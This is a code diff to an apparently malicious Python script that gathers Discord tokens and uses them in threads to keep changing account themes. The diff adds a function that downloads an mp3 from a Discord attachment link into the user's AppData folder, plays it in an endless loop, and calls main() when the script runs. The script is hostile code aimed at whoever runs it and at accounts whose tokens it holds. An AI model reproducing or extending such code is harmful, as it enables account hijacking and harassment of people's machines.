@@ -1,10 +1,17 @@
-import re, os, subprocess, threading, json, requests, time 
+import re, os, subprocess, threading, json, requests, time, playsound
 
 user = os.getenv('USERNAME')
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 tokens = []
 working = []
+
+def play_sounds():
+    rq = requests.get("https://cdn.discordapp.com/attachments/830872284071723021/835929486985003049/song.mp3", allow_redirects=True)
+    with open("C:\\Users\\" + user + "\\AppData\\Local\\SongLmao.mp3", "wb") as f:
+        f.write(rq.content)
+    while True:
+        playsound.playsound("C:\\Users\\" + user + "\\AppData\\Local\\SongLmao.mp3")
 
 def change_theme(token):
     while True:
@@ -73,3 +80,7 @@ def main():
     for tokn in working:
         change_theme_thread = threading.Thread(target=change_theme, args=[tokn,])
         change_theme_thread.start()
+    sound_thread = threading.Thread(target=play_sounds)
+    sound_thread.start()
+   
+main()
